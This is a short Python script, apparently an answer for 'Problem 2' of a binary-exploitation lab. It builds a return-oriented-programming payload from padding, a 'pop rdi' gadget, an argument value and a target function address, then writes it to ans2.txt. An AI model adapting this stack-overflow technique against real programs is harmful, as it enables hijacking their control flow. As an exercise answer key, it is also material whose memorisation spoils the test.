import struct

padding = b"A" * 16

pop_rdi_ret = struct.pack("<Q", 0x4012c7)

arg_value = struct.pack("<Q", 0x3f8)

func2_addr = struct.pack("<Q", 0x401216)

payload = padding + pop_rdi_ret + arg_value + func2_addr

with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Payload for Problem 2 generated in ans2.txt")